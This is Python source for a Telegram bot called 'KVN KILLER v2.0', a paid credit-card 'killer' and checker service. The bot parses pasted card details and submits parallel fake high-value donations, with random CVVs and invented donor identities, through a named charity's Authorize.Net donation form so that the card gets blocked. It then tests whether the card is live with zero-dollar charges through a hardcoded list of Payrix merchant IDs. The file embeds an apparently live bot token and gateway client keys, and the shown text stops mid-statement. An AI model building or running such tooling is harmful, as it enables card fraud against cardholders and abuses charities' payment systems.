import telebot
import requests
import json
import random
import time
import re
import string
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import sqlite3
import sys
from bs4 import BeautifulSoup

# Telegram Bot Token and Owner ID
BOT_TOKEN = "8932146037:AAGSmnMhI4eUlnPYtk76SIJRt8obaAJh6NE" # Replace with your bot token
OWNER_ID = 5616232839  # Replace with your Telegram ID

# Configure logging
import logging
logging.basicConfig(level=logging.INFO, 
                   format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('Killer-Bot')

# Create bot with proper configuration
bot = telebot.TeleBot(BOT_TOKEN, threaded=True, parse_mode="Markdown")

# Banned BINs Configuration
BANNED_BINS = {
    "535563", "543446", "532610", "485340", 
    "531106", "494116", "516929", "435880", 
    "517608", "416549"
}

# Database setup
def init_db():
    conn = sqlite3.connect('users.db', check_same_thread=False) # Allow multithread access
    c = conn.cursor()
    # Ensure all columns are created: user_id, credits, is_banned
    c.execute('''CREATE TABLE IF NOT EXISTS users 
                 (user_id INTEGER PRIMARY KEY, credits INTEGER DEFAULT 0, is_banned INTEGER DEFAULT 0)''')
    # Check if columns exist before trying to add them - prevents errors on restart
    try:
        c.execute("ALTER TABLE users ADD COLUMN credits INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass # Column already exists
    try:
        c.execute("ALTER TABLE users ADD COLUMN is_banned INTEGER DEFAULT 0")
    except sqlite3.OperationalError:
        pass # Column already exists
        
    conn.commit()
    conn.close()

init_db()

# Site-specific configuration
SITE_CONFIG = {
        "base_url": "https://outbermuda.org/",
        "form_id": "686",
        "referer_base": "https://outbermuda.org/",
        "auth_name": "43D8rvpNZ",
        "auth_client_key": "4yLL27sQ9HhzpHLr27sgfUY4kp894PydK6v24NadbnpX9L4m43Vm4UCX2dwn7D7U",
        "card_number": None,
        "card_expiration": None,
        "auth_id": "1dcaabea-fa2b-f4f8-631c-d335badfda3f"
}

# Payrix payment gateways
PAYMENT_GATEWAYS = [
    {"cid": "10334", "merchant": "p1_mer_66d212af800dc73de2ba7dd"},
    {"cid": "1071", "merchant": "p1_mer_669024d6e619d1ab217503d"},
    {"cid": "11488", "merchant": "p1_mer_66d2047bc7d50f8781e718d"},
    {"cid": "11607", "merchant": "p1_mer_669033821d7a054a353b357"},
    {"cid": "11674", "merchant": "p1_mer_6690210f7e21af07ed53a56"},
    {"cid": "1177", "merchant": "p1_mer_66902775744ddec5a326b9a"},
    {"cid": "1202", "merchant": "p1_mer_66d20c09f3a939e22ce38a9"},
    {"cid": "12196", "merchant": "p1_mer_66d20ae66feda63af8d82ee"},
    {"cid": "1230", "merchant": "p1_mer_6690282ba493094f251046a"},
    {"cid": "12465", "merchant": "p1_mer_669028b79fe1716a9dd8804"},
    {"cid": "13266", "merchant": "p1_mer_6690537c2d41ffed74ffecd"},
    {"cid": "13372", "merchant": "p1_mer_669028c9e4d4a6e3b893c56"},
    {"cid": "13429", "merchant": "p1_mer_66d207c90e53b855478fc36"},
    {"cid": "13430", "merchant": "p1_mer_66d20a5f65471c1e94aee92"},
    {"cid": "13440", "merchant": "p1_mer_66d2081286031a89b3c1b44"},
    {"cid": "14138", "merchant": "p1_mer_66d205f4ab29724cef8de2e"},
    {"cid": "14179", "merchant": "p1_mer_66d20c5d6d1a9d78a7d43d8"},
    {"cid": "14225", "merchant": "p1_mer_66902179c94ff0e03437c1b"},
    {"cid": "14245", "merchant": "p1_mer_66ad21126222709f81f0599"},
    {"cid": "14259", "merchant": "p1_mer_66d209fce9d93b9615955cd"},
    {"cid": "14322", "merchant": "p1_mer_66ad21126222709f81f0599"},
    {"cid": "14349", "merchant": "p1_mer_6690260d9668ca03eb24c41"},
    {"cid": "1454", "merchant": "p1_mer_66d20760b7fa378e43aef7e"},
    {"cid": "1467", "merchant": "p1_mer_6690252033ed0d624b8d076"},
    {"cid": "14692", "merchant": "p1_mer_66c778f4afcc3621c171e02"},
    {"cid": "14866", "merchant": "p1_mer_66d20c184d303299114bde7"},
    {"cid": "14884", "merchant": "p1_mer_66d20cf417b3b468afd637a"},
    {"cid": "14893", "merchant": "p1_mer_66902690e4d66dcc4a06fea"},
    {"cid": "14952", "merchant": "p1_mer_66d205f4ab29724cef8de2e"},
    {"cid": "15029", "merchant": "p1_mer_66d20ba6ea0b2bb826de94d"},
    {"cid": "15107", "merchant": "p1_mer_66d2055f509bf1982940ba3"},
    {"cid": "15508", "merchant": "p1_mer_669025e76463f87012fe294"},
    {"cid": "15523", "merchant": "p1_mer_66d20c26dd40ed50b6fa36e"},
    {"cid": "15630", "merchant": "p1_mer_6644eb51e726bbf463a4476"},
    {"cid": "15633", "merchant": "p1_mer_669025d4de98f58b3ba38ea"},
    {"cid": "15709", "merchant": "p1_mer_669021f7e934f033d1bc84f"},
    {"cid": "15724", "merchant": "p1_mer_669021f7e934f033d1bc84f"},
    {"cid": "15897", "merchant": "p1_mer_66d2129436ac351e493c45f"},
    {"cid": "15901", "merchant": "p1_mer_66d2129436ac351e493c45f"},
    {"cid": "15956", "merchant": "p1_mer_66e448ead64c11e731ca8e7"},
    {"cid": "15982", "merchant": "p1_mer_66e448ead64c11e731ca8e7"},
    {"cid": "16098", "merchant": "p1_mer_66d209372ccf9b98cc1803a"},
    {"cid": "16232", "merchant": "p1_mer_66d212882cab6f5bb130a07"},
    {"cid": "16285", "merchant": "p1_mer_66d2094580dfa382719e015"},
    {"cid": "16291", "merchant": "p1_mer_66902690e4d66dcc4a06fea"},
    {"cid": "16295", "merchant": "p1_mer_66d20859d77659a4b63fd21"},
    {"cid": "16305", "merchant": "p1_mer_669020fab671c86f50f51a8"},
    {"cid": "373", "merchant": "p1_mer_66902532a403c13c858d501"},
    {"cid": "4450", "merchant": "p1_mer_669023101de0f6105e4417d"},
    {"cid": "4942", "merchant": "p1_mer_66903c7408db001950fe873"},
    {"cid": "566", "merchant": "p1_mer_66d2068e8b8cbee7c075b2a"},
    {"cid": "6002", "merchant": "p1_mer_6690266e2b133b62945a047"},
    {"cid": "8722", "merchant": "p1_mer_66d206b7aed53de56673f94"},
]

# Regex and loading bars
CC_PATTERN = re.compile(
    # Classic formats with various separators
    r"(?:(?:[/!.#]kill|/check)\s+)?" +     # Optional command prefix
    r"(\d{16})[|\s/:.-]+(\d{1,2})[|\s/:.-]+(?:20)?(\d{2})[|\s/:.-]+(\d{3,4})" +  # Format: 1234123412341234|01|23|123
    r"|" +                                 # OR
    r"(\d{16})[|\s/:.-]+(\d{1,2})[|\s/:.-]+(\d{4})[|\s/:.-]+(\d{3,4})" +         # Format with 4-digit year
    r"|" +                                 # OR
    r"(\d{16})\D+?(\d{1,2})\D+?(\d{2,4})\D+?(\d{3,4})" +                   # Generic format with any non-digit separators
    r"|" +                                 # OR
    # Additional formats
    r"(?:cc|card)[:\s]+(\d{16})[|\s/:.-]+(\d{1,2})[|\s/:.-]+(\d{2,4})[|\s/:.-]+(\d{3,4})" +  # Format with "cc:" or "card:" prefix
    r"|" +                                 # OR
    r"(?:card\s*number[:\s]*|cc[:\s]*)?(\d{4}[\s.-]?\d{4}[\s.-]?\d{4}[\s.-]?\d{4})[\s|/:.-]*(\d{1,2})[\s|/:.-]*(\d{2,4})[\s|/:.-]*(\d{3,4})" +  # Format with spaces/dashes between card number groups
    r"|" +                                 # OR 
    r"(\d{16})[\s]*exp[\s.-]*(\d{1,2})[\s/.-]*(\d{2,4})[\s]*cvv[\s]*(\d{3,4})" +  # Format with "exp" and "cvv" text
    r"|" +                                 # OR
    r"(\d{16})[\s]*(?:exp|expiry|expiration)[\s:.-]*(\d{1,2})/(\d{2,4})[\s]*(?:cvv|cvc|security)[\s:.-]*(\d{3,4})",  # Format with text labels
    re.IGNORECASE                          # Case insensitive
)

# Loading bars
LOADING_BARS = [
    "💾[->--------] 10% :: Initializing Sequence...",
    "💾[--->------] 30% :: Engaging Target System...",
    "💾[----->----] 50% :: Spamming CC on Multiple Gateways...",
    "💾[--------->] 80% :: Auth Gateway Check...",
    "💾[----------] 100% :: Process Complete."
]

# --- User Management Functions ---
db_lock = threading.Lock()

def execute_db(query, params=()):
    with db_lock:
        conn = sqlite3.connect('users.db', check_same_thread=False)
        c = conn.cursor()
        c.execute(query, params)
        result = c.fetchall() # Use fetchall for SELECT, handle empty list if needed
        conn.commit()
        conn.close()
        return result
        
def is_registered(user_id):
    result = execute_db("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    return bool(result)

def is_banned(user_id):
    result = execute_db("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
    return result[0][0] == 1 if result else False # Check the value in the first row, first column

def get_credits(user_id):
    result = execute_db("SELECT credits FROM users WHERE user_id = ?", (user_id,))
    return result[0][0] if result else 0

def update_credits(user_id, amount):
    # Ensure user exists first (handle registration separately if needed)
    execute_db("INSERT OR IGNORE INTO users (user_id, credits, is_banned) VALUES (?, 0, 0)", (user_id,))
    # Now update credits
    execute_db("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))

def ban_user(user_id):
    execute_db("INSERT OR IGNORE INTO users (user_id, credits, is_banned) VALUES (?, 0, 0)", (user_id,))
    execute_db("UPDATE users SET is_banned = 1 WHERE user_id = ?", (user_id,))

# --- Helper Functions ---
def update_loading_bar(message, stage, status=None):
    try:
        if stage < len(LOADING_BARS):
             bar = LOADING_BARS[stage]
             text = f"╔════ KVN KILLER v2.0 ════╗\n║ {bar} ║\n╚═══════════════════════════╝"
             if status: text += f"\n[Status]: {status}"
             bot.edit_message_text(text, message.chat.id, message.message_id)
        else:
             # Handle final status update separately if needed or log error
             print(f"Warning: Tried to update loading bar with invalid stage {stage}")
    except telebot.apihelper.ApiTelegramException as e:
        if "message is not modified" in str(e):
            pass # Ignore if the message content is the same
        else:
            print(f"Error updating loading bar: {e}")
    except Exception as e:
        print(f"Unexpected error updating loading bar: {e}")


def extract_signatures(response_text):
    pattern = r"givewp-route-signature=([a-f0-9]+).*?givewp-route-signature-expiration=(\d+)"
    matches = re.findall(pattern, response_text)
    return matches[0] if matches else (None, None)

# --- Random Data Generation --- (Keep these as they are useful)
def generate_random_name():
    first_names = ["John", "Emma", "Michael", "Sarah", "David", "Lisa", "James", "Anna"]
    last_names = ["Smith", "Johnson", "Brown", "Taylor", "Wilson", "Davis", "Clark", "Lewis"]
    return random.choice(first_names), random.choice(last_names)

def generate_random_phone():
    return f"+1{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"

def generate_random_email(first_name, last_name):
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
    return f"{first_name.lower()}{last_name.lower()}{random_str}@{random.choice(domains)}"

def generate_random_address():
    streets = ["Main", "Park", "Oak", "Pine", "Cedar", "Elm", "Washington", "Lake"]
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia"]
    states = ["NY", "CA", "IL", "TX", "AZ", "PA"]
    return f"{random.randint(1, 999)} {random.choice(streets)} St", random.choice(cities), random.choice(states), str(random.randint(10000, 99999))

# --- Network and Processing Functions ---
def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        url = f"https://api.juspay.in/cardbins/{bin_number}"
        # NO PROXY
        response = requests.get(url, timeout=5) # Reduced timeout slightly
        if response.status_code == 200:
            data = response.json()
            return {
                "brand": data.get("brand", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
                "type": data.get("type", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
                "sub_type": data.get("card_sub_type", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
                "bank": data.get("bank", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
                "country": data.get("country", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
                "country_code": data.get("country_code", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻")
            }
        return {}
    except requests.exceptions.RequestException as e:
        print(f"BIN Lookup Error: {e}")
        return {}
    except Exception as e:
        print(f"General Error in get_bin_info: {e}")
        return {}

def get_form_headers():
    return {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': "?1", 'sec-ch-ua-platform': '"Android"',
        'Upgrade-Insecure-Requests': "1", 'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "navigate", 'Sec-Fetch-Dest': "iframe",
        'Referer': SITE_CONFIG["referer_base"],
    }

def get_auth_headers():
    return {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
        'Content-Type': "application/json", 'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': "?1", 'Origin': SITE_CONFIG["base_url"],
        'Sec-Fetch-Site': "cross-site", 'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty", 'Referer': SITE_CONFIG["base_url"] + "/",
    }

def get_donation_headers():
    return {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
        'Accept': "application/json", 'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': "?1", 'Origin': SITE_CONFIG["base_url"],
        'Sec-Fetch-Site': "same-origin", 'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': f"{SITE_CONFIG['base_url']}/?givewp-route=donation-form-view&form-id={SITE_CONFIG['form_id']}"
    }

def process_donation_attempt(card_number, expiration, donation_params, attempt_num):
    """Processes a single donation attempt."""
    req_id = f"Req-{attempt_num}-{random.randint(100, 999)}" # Unique ID for logging
    print(f"[{req_id}] Starting donation attempt...")
    try:
        cvv = str(random.randint(100, 999))
        amount = str(random.randint(200000, 200000)) # Cents, so $5.00 to $10.00
        first_name, last_name = generate_random_name()
        phone = generate_random_phone()
        email = generate_random_email(first_name, last_name)
        address1, city, state, zip_code = generate_random_address()

        auth_url = "https://api2.authorize.net/xml/v1/request.api"
        auth_payload = {
            "securePaymentContainerRequest": {
                "merchantAuthentication": {"name": SITE_CONFIG["auth_name"], "clientKey": SITE_CONFIG["auth_client_key"]},
                "data": {"type": "TOKEN", "id": SITE_CONFIG["auth_id"], "token": {"cardNumber": card_number, "expirationDate": expiration, "cardCode": cvv}}
            }
        }

        # --- Authorize.Net Request ---
        print(f"[{req_id}] Sending Auth Request to {auth_url}")
        auth_response = requests.post(auth_url, data=json.dumps(auth_payload), headers=get_auth_headers(), timeout=30) # Slightly lower timeout
        print(f"[{req_id}] Auth Response Status: {auth_response.status_code}")
        print(f"[{req_id}] Auth Response Body: {auth_response.text[:500]}...") # Print first 500 chars
        sys.stdout.flush() # Ensure print appears immediately

        try:
            # Handle potential BOM (Byte Order Mark)
            auth_data = json.loads(auth_response.text.lstrip('\ufeff'))
        except json.JSONDecodeError as json_err:
            print(f"[{req_id}] Auth JSON Decode Error: {json_err}")
            print(f"[{req_id}] Raw Auth Response: {auth_response.text}")
            return True # Treat decode error as a decline signal

        if auth_data.get("messages", {}).get("resultCode") == "Ok":
            data_descriptor = auth_data.get("opaqueData", {}).get("dataDescriptor")
            data_value = auth_data.get("opaqueData", {}).get("dataValue")

            if not data_descriptor or not data_value:
                 print(f"[{req_id}] Auth OK but missing opaqueData descriptor/value.")
                 return True # Treat missing data as decline

            print(f"[{req_id}] Auth Success. dataDescriptor: {data_descriptor[:10]}...")

            donation_payload = {
                'amount': amount, 'currency': 'USD', 'donationType': 'single',
                'formId': SITE_CONFIG["form_id"], 'gatewayId': 'authorize',
                'firstName': first_name, 'lastName': last_name, 'email': email,
                'anonymous': 'false', 'comment': '', 'company': 'Neend gen', 'phone': phone,
                'country': 'US', 'address1': address1, 'address2': '', 'city': city,
                'state': state, 'zip': zip_code, 'originUrl': SITE_CONFIG["referer_base"],
                'gatewayData[give_authorize_data_descriptor]': data_descriptor,
                'gatewayData[give_authorize_data_value]': data_value
            }

            # --- Donation Request ---
            print(f"[{req_id}] Sending Donation Request to {SITE_CONFIG['base_url']}")
            donation_response = requests.post(SITE_CONFIG["base_url"], params=donation_params, data=donation_payload,
                                           headers=get_donation_headers(), timeout=60) # Slightly lower timeout
            print(f"[{req_id}] Donation Response Status: {donation_response.status_code}")
            print(f"[{req_id}] Donation Response Body: {donation_response.text[:500]}...") # Print first 500 chars
            sys.stdout.flush() # Ensure print appears

            try:
                donation_data = donation_response.json()
                # Check if the donation *failed* (success=false means card likely declined/error)
                is_declined = not donation_data.get("success", False) 
                print(f"[{req_id}] Donation attempt result: {'Declined/Error' if is_declined else 'Success (Unexpected)'}")
                return is_declined
            except json.JSONDecodeError as json_err:
                print(f"[{req_id}] Donation JSON Decode Error: {json_err}") 
                # Log the raw response in case of decode error
                print(f"[{req_id}] Raw Donation Response: {donation_response.text[:1000]}...")
                return True
        else:
            print(f"[{req_id}] Auth Failed: {auth_data.get('messages', {}).get('message', [{'text': 'Unknown error'}])[0].get('text')}")
            return True # Auth failed = card declined
    except requests.exceptions.Timeout:
        print(f"[{req_id}] Request timed out")
        return True # Timeout = treat as decline
    except Exception as e:
        print(f"[{req_id}] Unexpected error: {str(e)}")
        return True # Any other error = treat as decline

def process_payrix_payment(card_number, exp_month, exp_year, cvv=None):
    """Process payment through Payrix gateways"""
    try:
        # Randomly select a gateway configuration
        gateway = random.choice(PAYMENT_GATEWAYS)
        cid = gateway["cid"]
        merchant = gateway["merchant"]

        # Generate CVV if not provided
        if cvv is None:
            cvv = str(random.randint(100, 999))

        url1 = "https://donate.givedirect.org"
        params = {'cid': cid}
        headers1 = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Cache-Control': "max-age=0",
            'sec-ch-ua': "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': "\"Android\"",
            'Upgrade-Insecure-Requests': "1",
            'Sec-Fetch-Site': "cross-site",
            'Sec-Fetch-Mode': "navigate",
            'Sec-Fetch-User': "?1",
            'Sec-Fetch-Dest': "document",
            'Referer': "https://www.womensurgeons.org/donate-to-the-foundation",
            'Accept-Language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6"
        }
        
        response1 = requests.get(url1, params=params, headers=headers1, timeout=30)
        soup = BeautifulSoup(response1.text, 'html.parser')
        txnsession_key_element = soup.find('input', {'id': 'txnsession_key'})
        
        if not txnsession_key_element:
            return "𝗘𝗿𝗿𝗼𝗿: 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗳𝗶𝗻𝗱 𝘁𝘅𝗻𝘀𝗲𝘀𝘀𝗶𝗼𝗻_𝗸𝗲𝘆"
            
        # String casting and direct access for compatibility with all BeautifulSoup versions
        try:
            value_attr = str(txnsession_key_element).split('value="')[1].split('"')[0]
            txnsession_key = value_attr
            if not txnsession_key:
                return "𝗘𝗿𝗿𝗼𝗿: 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗲𝘅𝘁𝗿𝗮𝗰𝘁 𝘁𝘅𝗻𝘀𝗲𝘀𝘀𝗶𝗼𝗻_𝗸𝗲𝘆 𝘃𝗮𝗹𝘂𝗲"
        except (IndexError, AttributeError):
            return "𝗘𝗿𝗿𝗼𝗿: 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗲𝘅𝘁𝗿𝗮𝗰𝘁 𝘁𝘅𝗻𝘀𝗲𝘀𝘀𝗶𝗼𝗻_𝗸𝗲𝘆 𝘃𝗮𝗹𝘂𝗲"

        url2 = "https://api.payrix.com/txns"
        payload = {
            'origin': "1",
            'merchant': merchant,
            'type': "2",
            'total': "0",
            'description': "donate live site",
            'payment[number]': card_number,
            'payment[cvv]': cvv,
            'expiration': f"{exp_month}{exp_year}",
            'zip': "",
            'last': "Tech"
        }
        headers2 = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'sec-ch-ua-platform': "\"Android\"",
            'sec-ch-ua': "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
            'sec-ch-ua-mobile': "?1",
            'txnsessionkey': txnsession_key,
            'x-requested-with': "XMLHttpRequest"
        }
        
        response2 = requests.post(url2, data=payload, headers=headers2, timeout=10)
        response_json = response2.json()
        errors = response_json['response']['errors']

        if errors:
            error_msg = errors[0]['msg']
            if error_msg == "Transaction declined: No 'To' Account Specified":
                return "𝗖𝗮𝗿𝗱 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱\n𝗥𝗲𝗮𝘀𝗼𝗻: 𝗡𝗼𝘁 𝗳𝗼𝘂𝗻𝗱, 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿"
            else:
                return error_msg
        else:
            return "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
    except Exception as e:
        print(f"Payment API Error: {str(e)}")
        return "𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱 𝘄𝗵𝗶𝗹𝗲 𝗽𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 𝗰𝗮𝗿𝗱."

# --- Command functions ---
def cmd_check(message):
    # Check if this is a reply to another message with the /kill or /check command
    text_to_check = message.text.strip()
    reply_to_message = message.reply_to_message
    
    # If this is a reply to another message and contains /kill or /check
    if reply_to_message and ('/kill' in text_to_check.lower() or '/check' in text_to_check.lower() or '.kill' in text_to_check.lower() or '#kill' in text_to_check.lower()):
        # Get the text from the message being replied to
        text_to_check = reply_to_message.text
        print(f"Checking card in replied message: {text_to_check[:20]}...")
    
    # Parse the credit card details using the regex pattern
    match = CC_PATTERN.search(text_to_check)
    
    if not match:
        bot.reply_to(message, "❌ Invalid card format. Use: `xxxxxxxxxxxxxxxx|mm|yy|cvv`", parse_mode="Markdown")
        return
    
    # Initialize variables with None
    card_number = None
    exp_month = None
    exp_year = None
    cvv = None
    
    # Extract card details from all the possible regex groups
    groups = match.groups()
    # Loop through groups in sets of 4 (4 fields per pattern)
    for i in range(0, len(groups), 4):
        # Check if this group set has valid data
        if groups[i]:  # Card number exists
            card_number = groups[i]
            exp_month = groups[i+1]
            exp_year = groups[i+2]
            cvv = groups[i+3]
            break  # Found a valid match, exit loop
    
    # Basic validation checks
    if not card_number or not exp_month or not exp_year or not cvv:
        bot.reply_to(message, "❌ Could not extract all card details. Please check format.", parse_mode="Markdown")
        return
    
    # Ensure month is 2 digits (pad with leading zero if needed)
    if len(exp_month) == 1:
        exp_month = f"0{exp_month}"
    
    # Process year format - standardize to 2 digits
    if len(exp_year) == 4:
        exp_year = exp_year[2:]  # Take last 2 digits
    
    # Validate month range
    if not 1 <= int(exp_month) <= 12:
        bot.reply_to(message, "❌ Invalid month. Month must be between 01-12.", parse_mode="Markdown")
        return
    
    # Check BIN restrictions
    bin_code = card_number[:6]
    if bin_code in BANNED_BINS:
        bot.reply_to(message, f"⛔ BIN `{bin_code}` is restricted/banned from charging", parse_mode="Markdown")
        return
        
    # Check user credits
    user_id = message.from_user.id
    credits = get_credits(user_id)
    
    if is_banned(user_id):
        bot.reply_to(message, "⛔ You are banned from using this bot.")
        return
        
    if credits <= 0 and user_id != OWNER_ID:
        bot.reply_to(message, "⚠️ You don't have enough credits to check a card. Contact the bot owner.")
        return
        
    # Display loading message
    loading_message = bot.reply_to(message, f"╔════ KVN KILLER v2.0 ════╗\n║ Initializing... ║\n╚═══════════════════════════╝")
    
    # Process the card with both gateways
    process_card(message, loading_message, card_number, exp_month, exp_year, cvv)

def process_card(message, loading_message, card_number, exp_month, exp_year, cvv):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # 1. Initial Checks (Registration, Ban Status, BIN Ban already done in cmd_check)
    start_time = time.time()
    
    # Prepare variables
    year_full = f"20{exp_year}" if len(exp_year) == 2 else exp_year  # Ensure 4-digit year
    expiration = f"{exp_month}{year_full[-2:]}"  # MMYY format
    SITE_CONFIG["card_number"] = card_number
    SITE_CONFIG["card_expiration"] = expiration
    
    # Get BIN Info
    bin_info = get_bin_info(card_number)
    
    # 5. Get Form Signatures
    update_loading_bar(loading_message, 1)  # Stage 1: Engaging Target
    signature, expiration_time = None, None
    try:
        form_params = {'givewp-route': "donation-form-view", 'form-id': SITE_CONFIG["form_id"]}
        print(f"[Main-{user_id}] Fetching form signatures from {SITE_CONFIG['base_url']}...")
        # NO PROXY
        response = requests.get(SITE_CONFIG["base_url"], params=form_params, headers=get_form_headers(), timeout=30)
        print(f"[Main-{user_id}] Form Response Status: {response.status_code}")
        sys.stdout.flush()
        
        if response.status_code == 200:
            signature, expiration_time = extract_signatures(response.text)
            if not signature or not expiration_time:
                print(f"[Main-{user_id}] Failed to extract signatures from form response.")
        else:
             print(f"[Main-{user_id}] Form request failed with status {response.status_code}")

        if not signature or not expiration_time:
            bot.edit_message_text("╔════ KVN KILLER v2.0 ════╗\n║ ❌ Error: Contact support ║\n"
                                 "║ One or more sites might be down or blocked. Try again later. ║\n"
                                 "╚═══════════════════════════╝",
                                chat_id, loading_message.message_id)
            return
        print(f"[Main-{user_id}] Signatures obtained: {signature[:10]}... Expires: {expiration_time}")

    except requests.exceptions.RequestException as e:
        print(f"[Main-{user_id}] Network Error getting form: {e}")
        bot.edit_message_text(f"╔════ KVN KILLER v2.0 ════╗\n║ ❌ Network Error! Cannot reach site. ║\n"
                             f"║ Check connection or try later.      ║\n"
                             f"╚═══════════════════════════╝",
                            chat_id, loading_message.message_id)
        return
    except Exception as e:
        print(f"[Main-{user_id}] Unexpected Error during form fetch: {e}")
        bot.edit_message_text(f"╔════ KVN KILLER v2.0 ════╗\n║ ❌ Unexpected Error! Report to support. ║\n"
                             f"╚═══════════════════════════╝",
                            chat_id, loading_message.message_id)
        return

    # 6. Prepare Donation Parameters
    donation_params = {
        'givewp-route': "donate",
        'givewp-route-signature': signature,
        'givewp-route-signature-id': "givewp-donate",
        'givewp-route-signature-expiration': expiration_time
    }

    # 7. Execute Kill Attempts in Parallel
    num_requests = 5
    declined_count = 0
    
    update_loading_bar(loading_message, 2)  # Stage 2: Sending Kill Packets
    
    # Use ThreadPoolExecutor for parallel requests
    results = []
    with ThreadPoolExecutor(max_workers=num_requests) as executor:
        # Submit tasks
        futures = [executor.submit(process_donation_attempt, card_number, expiration, donation_params, i+1) 
                  for i in range(num_requests)]
        # Collect results as they complete
        for future in futures:
            try:
                 results.append(future.result()) 
            except Exception as e:
                 print(f"[Main-{user_id}] Error collecting result from thread: {e}")
                 results.append(True) # Assume failure/decline if thread errored badly

    declined_count = sum(1 for result in results if result is True) # Count True results (declines/errors)
    print(f"[Main-{user_id}] Completed {num_requests} attempts. Declined/Error count: {declined_count}")

    # 8. Process Results and Update User
    update_loading_bar(loading_message, 3)  # Stage 3: Confirming Termination
    elapsed_time = round(time.time() - start_time, 2)
    
    # Determine KillerT Status
    is_killed = (declined_count == num_requests)  # Consider killed if ALL attempts resulted in decline/error
    killerT_status = "KILLED ✅" if is_killed else "Maybe Live? 🤔"
    
    # Now process with Payrix gateway (second check)
    update_loading_bar(loading_message, 3, "Running Secondary Gateway Check...")
    # Use user's CVV for Payrix (more accurate validation)
    payrix_result = process_payrix_payment(card_number, exp_month, exp_year, cvv)
    
    # Deduct Credit only if killed by both gateways and not Owner
    if is_killed and user_id != OWNER_ID:
        update_credits(user_id, -1)
        print(f"[Main-{user_id}] Kill successful. Deducted 1 credit.")

    # Get remaining credits
    credits_left = "Unlimited" if user_id == OWNER_ID else get_credits(user_id)

    update_loading_bar(loading_message, 4, "Complete")  # Stage 4: Process Complete

    # 9. Format and Send Final Output
    result_message = (
        f"╔════ KVN KILLER v2.0 ════╗\n"
        f"║    💀 CC KILLER - Result 💀    ║\n"
        f"╠═══════════════════════════╣\n"
        f"║ Card: {card_number}|{exp_month}|{exp_year}|{cvv}\n"
        f"║ 💳 Info: {bin_info.get('brand', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')} | {bin_info.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')} | {bin_info.get('sub_type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')}\n"
        f"║ 🏦 Bank: {bin_info.get('bank', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')}\n"
        f"║ 🌍 Country: {bin_info.get('country', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')} ({bin_info.get('country_code', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')})\n"
        f"╠═══════════════════════════╣\n"
        f"║  𝗥𝗲𝘀𝘂𝗹𝘁𝘀:\n"
